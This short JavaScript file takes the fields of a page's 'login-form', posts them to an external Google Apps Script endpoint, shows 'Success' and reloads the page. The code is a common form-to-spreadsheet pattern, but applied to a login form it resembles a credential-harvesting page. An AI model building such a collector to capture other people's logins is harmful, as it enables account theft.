/* eslint-disable no-unused-vars */
let scriptsUrl = 'https://script.google.com/macros/s/AKfycbxqAdu97HTkVnqSxrAY4mwVZ5Cz6sSDGBBs_cJ6GtTqervEBTwJRDsbxJ3xaAjhMKGC/exec';

const form = document.forms['login-form'];

form.addEventListener('submit', (e) => {
  e.preventDefault();
  fetch(scriptsUrl, {method: 'POST', body: new FormData(form)})
  .then(response=> alert("Success"))
  .then(()=> { window.location.reload();})
  .catch((error)=> alert("Error"));
});

